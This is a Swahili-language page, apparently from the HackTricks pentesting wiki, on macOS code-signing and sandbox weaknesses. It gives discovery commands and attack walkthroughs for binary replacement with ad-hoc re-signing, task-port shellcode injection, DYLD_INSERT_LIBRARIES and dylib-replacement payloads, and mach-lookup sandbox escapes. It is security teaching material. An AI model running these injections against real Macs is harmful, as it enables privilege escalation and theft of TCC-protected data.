# Udhaifu wa Code Signing ya macOS na Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Taarifa za Msingi

**Ad-hoc signing** (`CS_ADHOC`) huunda code signature yenye **hakuna certificate chain** — ni hash ya code bila uthibitishaji wa developer identity. Asili ya binary haiwezi kufuatiliwa hadi kwa developer au organization yoyote.<sup>[[1]](#references)[[4]](#references)</sup>

Kwenye Mac za Apple Silicon, executables zote zinahitaji angalau ad-hoc signature. Hii inamaanisha utapata ad-hoc signatures kwenye development tools nyingi, Homebrew packages, na third-party utilities.

### Kwa Nini Hili Ni Muhimu

- **Hakuna identity inayoweza kuthibitishwa** — binary inaweza kubadilishwa bila kugunduliwa na identity-based checks
- Third-party ad-hoc binaries zilizo kwenye **privileged positions** (FDA, daemon, helpers) ni targets zenye kipaumbele cha juu
- Kwenye baadhi ya configurations, ad-hoc signatures huenda **zisithibitishwe kwa ukali sawa** na developer-signed code
- Ad-hoc signed binaries zilizo na **TCC grants** ni muhimu hasa — grants huendelea kuwepo hata kama binary content itabadilika (inategemea jinsi TCC ilivyoweka grant key)

### Ugunduzi
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Processes Zinazoweza ku-debug (get-task-allow)

### Taarifa za Msingi

**`com.apple.security.get-task-allow`** entitlement (au **`CS_GET_TASK_ALLOW`** flag) inaruhusu **process yoyote kujiunga kama debugger**, kusoma memory, kurekebisha registers, kuingiza code, na kudhibiti execution.<sup>[[3]](#references)</sup>

Hii imekusudiwa **kwa ajili ya development builds pekee**. Hata hivyo, baadhi ya third-party binaries husafirishwa zikiwa na entitlement hii katika production.

> [!CAUTION]
> Production binary iliyo na `get-task-allow` ni **exploitation primitive ya papo hapo**. Process yoyote ya ndani inaweza kuita `task_for_pid()`, kupata Mach task port ya target, na kuingiza arbitrary code ambayo huendeshwa ikiwa na entitlements, TCC grants, na security context za target.

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### Mchanganyiko Hatari

Binary inapokuwa na **vyote viwili**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (inapakia dylib yoyote)
- `com.apple.security.cs.allow-dyld-environment-variables` (inakubali DYLD env vars)

Hii ni **primitive ya code injection iliyohakikishwa** — `DYLD_INSERT_LIBRARIES` hufanya kazi kikamilifu.

### Ugunduzi
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Temporary Exceptions za Sandbox

### Jinsi Zinavyodhoofisha Sandbox

Temporary exceptions za Sandbox (`com.apple.security.temporary-exception.*`) hufungua mianya katika App Sandbox:<sup>[[2]](#references)</sup>

| Exception | Kile Inachoruhusu |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Kuunganisha kwenye huduma za XPC/Mach za mfumo mzima |
| `temporary-exception.files.absolute-path.read-write` | Kusoma/kuandika mafaili nje ya app container |
| `temporary-exception.iokit-user-client-class` | Kufungua miunganisho ya IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Kusoma mapendeleo ya apps nyingine |
| `temporary-exception.files.home-relative-path.read-write` | Kufikia paths zinazohusiana na `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

Exception hatari zaidi ni **mach-lookup** — huruhusu app iliyo kwenye Sandbox kuwasiliana na daemons zenye privileged:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Entitlements za Apple za Kibinafsi

### Ni Nini

Entitlements zenye kiambishi `com.apple.private.*` hutoa ufikiaji wa **APIs za ndani za Apple** ambazo hazijaandikwa kwenye nyaraka au hazipatikani kwa developers wa third-party. Binaries za third-party zilizo na private entitlements huzipata kupitia enterprise cert, MDM, au usambazaji usio wa App Store.

### Private Entitlements Hatari

| Entitlement | Uwezo |
|---|---|
| `com.apple.private.tcc.manager` | Kusoma/kuandika kikamilifu database ya TCC |
| `com.apple.private.tcc.allow` | Kufikia huduma mahususi za TCC |
| `com.apple.private.security.no-sandbox` | Kuendesha bila sandbox |
| `com.apple.private.iokit` | Ufikiaji wa moja kwa moja wa driver wa IOKit |
| `com.apple.private.kernel.\*` | Ufikiaji wa kernel interface |
| `com.apple.private.xpc.launchd.job-label` | Kusajili/kudhibiti launchd jobs |
| `com.apple.rootless.install` | Kuandika kwenye paths zilizolindwa na SIP |

### Ugunduzi
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles

### Ni Nini

Binaries zinaweza kusambazwa zikiwa na **custom sandbox profiles** zilizoandikwa katika SBPL (Seatbelt Profile Language). Profiles hizi zinaweza kuwa zenye vizuizi zaidi AU **zenye ruhusa zaidi** kuliko App Sandbox ya kawaida.

### Kukagua Custom Profiles
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Njia za Library Zinazoweza Kuandikwa

### Ni Nini

Binary inapopakia library inayobadilika kutoka kwenye path ambayo user wa sasa anaweza **kuandika**, library hiyo inaweza kubadilishwa na code hasidi.

### Ugunduzi
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Marejeo

- [1] [Apple Developer — Mwongozo wa Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operesheni za `CS_OPS_*` na `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (handler ya `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)

{{#include ../../../banners/hacktricks-training.md}}
